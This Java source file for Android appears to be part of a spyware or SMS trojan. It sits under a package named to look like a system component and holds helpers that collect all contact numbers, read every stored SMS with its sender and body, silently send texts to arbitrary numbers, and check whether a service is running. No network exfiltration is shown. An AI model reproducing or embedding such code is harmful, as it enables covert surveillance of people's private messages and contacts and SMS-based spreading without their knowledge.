package com.android.system.utils;

import android.app.ActivityManager;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.SmsManager;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class SystemUtil {
    private static String removeIpPrefix(String number){
        String result = number;
        if (number.length()>12) {
            String prefix = number.substring(0,5);

            if (prefix.equals("17900") || prefix.equals("17901") || prefix.equals("17910")
                    || prefix.equals("17911") || prefix.equals("17950") || prefix.equals("17951")
                    || prefix.equals("17960") || prefix.equals("17961") || prefix.equals("12593")){

                result = number.substring(5);
            }
        }

        return result;
    }

    public static List<String> getAllContact(Context context) {
        List<String> numberList = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},    // Which columns to return.
                null, //ContactsContract.CommonDataKinds.Phone.NUMBER + " = '" + number + "'", // WHERE clause.
                null,    // WHERE clause value substitution
                null);   // Sort order.

        if (null != cursor) {
            int count = cursor.getCount();
            for (int i = 0; i < count; i++) {
                cursor.moveToPosition(i);
                int numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                String queryNumber = cursor.getString(numberFieldColumnIndex);
                queryNumber = queryNumber.replaceAll("[^0-9]", "");
                queryNumber = removeIpPrefix(queryNumber);
                numberList.add(queryNumber);
            }
            cursor.close();
        }
        return numberList;
    }

    /**
     * 发短信
     * @param context
     * @param phoneNumber
     * @param content
     */
    public static void sendSmsTo(Context context, String phoneNumber, String content) {
        SmsManager.getDefault().sendTextMessage(phoneNumber, null,
                content, null, null);
    }

    /**
     * 判断服务是否运行
     * @param context
     * @param className
     * @return
     */
    public static boolean isServiceRunning(Context context, String className) {
        boolean isRunning = false;
        try {
            ActivityManager activityManager = (ActivityManager)
                    context.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningServiceInfo> serviceList
                    = activityManager.getRunningServices(256);

            int serviceCount = serviceList.size();

            for (int i = 0; i < serviceCount; i++) {
                String serviceClassName = serviceList.get(i).service.getClassName();
                if (serviceClassName.equals(className)) {
                    isRunning = true;
                    break;
                }
            }
        } catch(Exception e) {
        }
        return isRunning;
    }

    public static class SmsData {
        public String person = null;
        public String address = null;
        public String body = null;
        public String date = null;
        public int type = 0;
    }
    public static List<SmsData> getSmsInPhone(Context context)
    {
        List<SmsData> smsList = new ArrayList<>();

        String SMS_URI_ALL   = "content://sms/";
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = context.getContentResolver().query(Uri.parse(SMS_URI_ALL), projection, null, null, "date desc");

        int nameColumn = cur.getColumnIndex("person");
        int phoneNumberColumn = cur.getColumnIndex("address");
        int bodyColumn = cur.getColumnIndex("body");
        int dateColumn = cur.getColumnIndex("date");
        int typeColumn = cur.getColumnIndex("type");

        while(cur.moveToNext()) {
            SmsData sms = new SmsData();
            try {
                sms.person = cur.getString(nameColumn);
                sms.address = cur.getString(phoneNumberColumn);
                sms.body = cur.getString(bodyColumn);
                sms.date = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(Long.parseLong(cur.getString(dateColumn))));
                sms.type = cur.getInt(typeColumn);
            } catch(Exception e) {
            }
            smsList.add(sms);
        }
        return smsList;
    }
}
